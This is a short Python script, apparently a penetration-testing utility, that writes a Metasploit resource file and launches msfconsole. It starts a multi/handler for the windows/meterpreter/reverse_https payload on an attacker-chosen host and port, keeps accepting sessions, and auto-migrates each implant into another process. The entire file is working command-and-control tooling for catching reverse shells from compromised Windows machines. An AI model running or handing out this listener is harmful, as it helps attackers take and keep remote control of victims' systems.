#!/usr/bin/env python
#
# StartListener.py
# Simple python script to start a Meterpreter HTTPs Handler
# by Chris Campbell (obscuresec)
#
import sys
import subprocess
from subprocess import check_output
import platform
import os
import sys

#write a resource file and call it
def req():
	try:
		path = check_output(["which", "msfconsole"])
	except:
		response = "Please install msfconsole"
		raise SystemExit
		
	return path

def build(lhost,lport,msf_path):
    options = "use multi/handler\n"
    options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
    options += "set ExitOnSession false\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j\n"
    filewrite = file("listener.rc", "w")
    filewrite.write(options)
    filewrite.close()
    
    arg = msf_path.split("\n")[0] + " -r listener.rc"
    subprocess.Popen(arg, shell=True).wait()

#grab args
try:    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    msf_path = req()
    build(lhost,lport, msf_path)

#index error
except IndexError:
    print "python StartListener.py lhost lport"

